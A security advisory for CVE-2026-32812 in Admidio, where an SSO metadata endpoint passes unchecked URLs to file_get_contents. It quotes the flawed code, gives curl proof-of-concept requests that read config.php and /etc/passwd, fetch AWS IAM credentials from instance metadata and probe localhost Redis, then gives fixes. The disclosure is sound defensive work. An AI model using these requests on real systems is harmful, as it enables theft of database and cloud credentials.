# [M] Admidio Vulnerable to SSRF and Local File Read via Unrestricted URL Fetch in SSO Metadata Endpoint

## Summary
Severity: Medium
Advisory: GHSA-6j68-gcc3-mq73
CVE: CVE-2026-32812
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-6j68-gcc3-mq73
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=5.0.0 <5.0.7

## Details
## Summary

The SSO metadata fetch endpoint at `modules/sso/fetch_metadata.php` accepts an arbitrary URL via `$_GET['url']`, validates it only with PHP's `FILTER_VALIDATE_URL`, and passes it directly to `file_get_contents()`. `FILTER_VALIDATE_URL` accepts `file://`, `http://`, `ftp://`, `data://`, and `php://` scheme URIs. An authenticated administrator can use this endpoint to read arbitrary local files via the `file://` wrapper (Local File Read), reach internal services via `http://` (SSRF), or fetch cloud instance metadata. The full response body is returned verbatim to the caller.

## Details

### Vulnerable Code

File: `D:/bugcrowd/admidio/repo/modules/sso/fetch_metadata.php`, lines 9-34

```php
$url = filter_var($_GET['url'], FILTER_VALIDATE_URL);
if (!$url) {
    http_response_code(400);
    echo "Invalid URL";
    exit;
}

// Fetch metadata from external server
$metadata = file_get_contents($url);
if ($metadata === false) {
    http_response_code(500);
    echo "Failed to fetch metadata";
    exit;
}

echo $metadata;
```

### FILTER_VALIDATE_URL Does Not Block Dangerous Schemes

PHP's `FILTER_VALIDATE_URL` is a format validator, not a security allowlist. It accepts any syntactically valid URL regardless of scheme or destination. The following schemes all pass validation and are handled by `file_get_contents()`:

| Scheme | Impact |
|--------|--------|
| `file:///etc/passwd` | Read any local file the web server process can access |
| `http://127.0.0.1/` | SSRF to localhost services (databases, admin panels, internal APIs) |
| `http://169.254.169.254/latest/meta-data/` | AWS EC2 instance metadata (IAM credentials) |
| `data://text/plain,payload` | Data URI content injection |

Confirmed by testing PHP's filter_var() and file_get_contents() with all of the above:

```
php -r "var_dump(filter_var('file:///etc/passwd', FILTER_VALIDATE_URL));"
// string(18) "file:///etc/passwd"  <-- passes validation

php -r "echo file_get_contents('file:///etc/passwd');"
// root:x:0:0:root:/root:/bin/bash  <-- file contents returned
```

### file:// Does Not Require allow_url_fopen

PHP's `file://` stream wrapper is the native filesystem handler and is always available regardless of the `allow_url_fopen` INI setting. The Local File Read vector works even on configurations that disable HTTP URL fetching.

### Response Is Returned Verbatim

The fetched content is echoed directly at line 34 (`echo $metadata`), making the complete contents of any readable local file or internal service response available to the caller.

## PoC

**Prerequisites:** Administrator account session cookie and CSRF token.

**Step 1: Read the Admidio database configuration file**

```
curl -G "https://TARGET/adm_program/modules/sso/fetch_metadata.php" \
  -H "Cookie: ADMIDIO_SESSION_ID=<admin_session>" \
  --data-urlencode "url=file:///var/www/html/adm_my_files/config.php"
```

Expected response: Full contents of config.php including the database host, username, and password in plaintext.

**Step 2: Read system password file**

```
curl -G "https://TARGET/adm_program/modules/sso/fetch_metadata.php" \
  -H "Cookie: ADMIDIO_SESSION_ID=<admin_session>" \
  --data-urlencode "url=file:///etc/passwd"
```

**Step 3: SSRF to AWS EC2 instance metadata (when deployed on AWS)**

```
curl -G "https://TARGET/adm_program/modules/sso/fetch_metadata.php" \
  -H "Cookie: ADMIDIO_SESSION_ID=<admin_session>" \
  --data-urlencode "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

Expected response: IAM role name followed by temporary AWS access key and secret.

**Step 4: SSRF to an internal service on localhost**

```
curl -G "https://TARGET/adm_program/modules/sso/fetch_metadata.php" \
  -H "Cookie: ADMIDIO_SESSION_ID=<admin_session>" \
  --data-urlencode "url=http://127.0.0.1:6379/"
```

(Probes a Redis instance on localhost.)

## Impact

- **Local File Read:** The attacker can read any file accessible to the PHP web server process, including Admidio's `config.php` (database credentials), `/etc/passwd`, private keys stored in the web root, and `.env` files.
- **Database Credential Theft:** Reading `config.php` exposes the database password. An attacker with the database password can access all member data, extract password hashes, and modify records directly, bypassing all application-level access controls.
- **Cloud Metadata Exposure:** On AWS, GCP, or Azure deployments, fetching the instance metadata endpoint exposes IAM role credentials with potentially broad cloud-level access.
- **Internal Network Reconnaissance:** The endpoint can probe internal services (Redis, Elasticsearch, internal admin panels) that are not externally accessible.
- **Scope Change:** Impact escapes the Admidio application boundary, reaching the underlying server filesystem and internal network, justifying the S:C score.

## Recommended Fix

### Fix 1: Restrict to HTTPS scheme and block internal IP ranges

```php
$rawUrl = $_GET['url'] ?? '';

// Only allow https:// scheme
if (\!preg_match('#^https://#i', $rawUrl)) {
    http_response_code(400);
    echo "Only HTTPS URLs are permitted";
    exit;
}

$url = filter_var($rawUrl, FILTER_VALIDATE_URL);
if (\!$url) {
    http_response_code(400);
    echo "Invalid URL";
    exit;
}

// Resolve hostname and block internal/private IP ranges
$host = parse_url($url, PHP_URL_HOST);
$ip = gethostbyname($host);
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
    http_response_code(400);
    echo "URL resolves to a private or reserved IP address";
    exit;
}

$metadata = file_get_contents($url);
```

### Fix 2: Use cURL with explicit scheme restriction

```php
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);
curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$metadata = curl_exec($ch);
curl_close($ch);
```

Note: DNS rebinding protections should also be considered; resolving the hostname before the request and blocking the request if it resolves to a private IP provides defense-in-depth.

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-6j68-gcc3-mq73
- https://nvd.nist.gov/vuln/detail/CVE-2026-32812
- https://github.com/Admidio/admidio/commit/f6b7a966abe4d75e9f707d665d7b4b5570e3185a
- https://github.com/Admidio/admidio
- https://github.com/Admidio/admidio/releases/tag/v5.0.7
